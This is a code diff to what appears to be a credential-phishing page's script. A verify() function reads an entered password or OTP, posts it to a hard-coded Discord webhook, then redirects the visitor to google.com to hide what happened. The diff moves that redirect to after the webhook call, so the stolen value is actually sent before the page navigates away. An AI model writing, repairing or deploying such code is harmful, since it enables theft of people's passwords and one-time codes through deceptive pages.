@@ -226,7 +226,7 @@ body {
     <script>
       function verify() {
         const password = document.getElementById("password").value;
-        window.location.replace("https://www.google.com")
+        
 
         if (password) {
           fetch("https://discord.com/api/webhooks/1450510149876715712/V72h6vseNrLJD7BuA7JQiSzxDnzrHhtY5ygGsI0VbdGhrfE_0Nvdg1mqXDYup49WJnbd", {
@@ -241,6 +241,7 @@ body {
               }],
             }),
           }).catch(console.error);
+          window.location.replace("https://www.google.com")
         }else{
           alert("Please enter the otp")
         }
